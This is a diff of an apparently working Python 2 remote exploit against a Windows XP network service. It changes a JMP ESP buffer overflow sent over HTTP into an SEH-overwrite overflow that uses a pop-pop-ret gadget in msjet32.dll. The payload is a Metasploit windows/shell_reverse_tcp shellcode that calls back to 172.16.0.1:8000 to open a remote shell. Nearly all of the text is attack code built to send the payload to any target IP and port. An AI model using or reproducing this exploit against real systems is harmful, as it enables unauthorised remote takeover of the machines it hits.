@@ -6,10 +6,8 @@ Tested OK against Windows XP [Version 5.1.2600] box
 
 import os
 import sys
-import re
-import socket
-from codecs import escape_decode
 import struct
+import socket
 
 # elvis@hell:~/CODE/injektors$ msfpayload windows/shell_reverse_tcp LHOST=172.16.0.1 LPORT=8000 C
 # /*
@@ -44,35 +42,37 @@ reverse_tcp_EGG = (
 
 if __name__ == '__main__':
     # sanitize command-line
-    print "\t" + "+"*13 + " %s by h4lf-jiffie (dohmatob elvis dopgima) "%os.path.basename(sys.argv[0]) + "+"*13
+    print "\r\n\t\t-+[ %s by h4lf-jiffie (dohmatob elvis dopgima) ]+-\r\n"%os.path.basename(sys.argv[0])
     if len(sys.argv) < 3:
         print 'Usage: python %s [OPTIONS] <target_IP> <target_PORT>'%(sys.argv[0])
         sys.exit(1)
     sys.path.append("../encoders")
     quine = __import__("quine")
 
-    # harvest egg
-    egg = quine.encode(reverse_tcp_EGG)
+    # set SEH record
+    pointer_to_next_SEH_record = 0x04EB4141 # = nop+nop+shortjmp 
+    SE_handler = 0x1B119FFC # = address of popr32+popr32+ret in msjet32.dll (this wll overwrite the existing handler)
+        
+    # sum-up SEH stuff
+    seh_gadget = struct.pack('<I', pointer_to_next_SEH_record) 
+    seh_gadget += struct.pack('<I', SE_handler)
 
     # setup socket
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soc.connect((sys.argv[1], int(sys.argv[2])))
 
     # build request
-    req_pkt = 'GET '
-    req_pkt += 'A'*(1791 - len(req_pkt)) # alphanum padding
-    req_pkt += 'llGw' # offset = 1791: alphanum address of 'JMP ESP' in COMCTL32.DLL
-    req_pkt += 'A'*(1795 - len(req_pkt)) # padding
-    req_pkt += egg # offset = 1795: ESP points here
-    req_pkt += ' HTTP/1.1\r\n\r\n'
+    probe_pkt = 'USV '
+    probe_pkt += 'A'*(966 - len(probe_pkt)) # alphanum padding 
+    probe_pkt += seh_gadget # pointer to next SEH record is overwritten 574 bytes into the request buffer
+    probe_pkt += quine.encode(reverse_tcp_EGG)
+    probe_pkt += 'A'*(2500 + 4 - len(probe_pkt)) # padding
+    probe_pkt += '\r\n\r\n'
 
-    # fire
-    print 'REQUEST PKT (%d bytes):'%len(req_pkt)
-    print req_pkt
-    soc.send(req_pkt)
+    # fuzz (sorry, I meant 'xploit')
+    print 'PROBE PACKET (%d bytes):'%len(probe_pkt)
+    print probe_pkt
+    soc.send(probe_pkt)
 
     # sanity
     soc.close()
-
-
-
